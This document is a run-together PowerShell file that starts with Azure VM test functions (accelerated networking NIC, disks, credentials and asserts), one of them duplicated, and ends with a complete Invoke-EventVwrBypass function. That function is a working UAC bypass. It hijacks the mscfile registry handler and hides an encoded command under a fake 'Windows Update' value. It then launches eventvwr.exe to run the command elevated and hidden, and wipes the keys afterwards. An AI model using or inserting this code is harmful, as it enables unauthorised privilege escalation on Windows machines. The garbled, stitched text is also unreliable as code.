$p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage "westcentralus" "MicrosoftWindowsServer";$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.EnableAcceleratedNetworking $trueRemove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-VMNicWithAcceleratedNetworkingValidations{$rgname = Get-ComputeTestResourceNametry{[string]$loc = Get-ComputeVMLocation;$loc = $loc.Replace(' ', '');New-AzResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_DS15_v2';$vmname = 'vm' + $rgname;$p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -EnableAcceleratedNetworking -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;Assert-AreEqual $nic.EnableAcceleratedNetworking $true$p = Add-AzVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage "westcentralus" "MicrosoftWindowsServer";$p = ($imgRef | Set-AzVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.EnableAcceleratedNetworking $trueRemove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Invoke-EventVwrBypass {[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]Param ([Parameter(Mandatory = $True)][ValidateNotNullOrEmpty()][String]$Command,[Switch]$Force)$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktopif(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {"[!] Current user not a local administrator!"Throw ("Current user not a local administrator!")}if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {"[!] Not in a medium integrity process!"Throw ("Not in a medium integrity process!")}if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){"UAC is set to 'Always Notify'. This module does not bypass this setting."exit}else{$RegPath = 'HKCU:Software\Microsoft\Windows\Update'$parts = $RegPath.split('\');$path = $RegPath.split("\")[0..($parts.count -2)] -join '\';$name = $parts[-1];$null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;$mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"$launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){New-Item $mscCommandPath -Force |New-ItemProperty -Name '(Default)' -Value $launcherCommand -PropertyType string -Force | Out-Null}else{Write-Warning "Key already exists, consider using -Force"exit}if (Test-Path $mscCommandPath) {Write-Verbose "Created registry entries to hijack the msc extension"}else{Write-Warning "Failed to create registry key, exiting"exit}$EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {$Process = Start-Process -FilePath $EventvwrPath -PassThruWrite-Verbose "Started eventvwr.exe"}Write-Verbose "Sleeping 5 seconds to trigger payload"if (-not $PSBoundParameters['WhatIf']) {Start-Sleep -Seconds 5}$mscfilePath = 'HKCU:\Software\Classes\mscfile'$PayloadPath = 'HKCU:Software\Microsoft\Windows'$PayloadKey = "Update"if (Test-Path $mscfilePath) {Remove-Item $mscfilePath -Recurse -ForceRemove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKeyWrite-Verbose "Removed registry entries"}if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){Stop-Process -Id $Process.IdWrite-Verbose "Killed running eventvwr process"}}}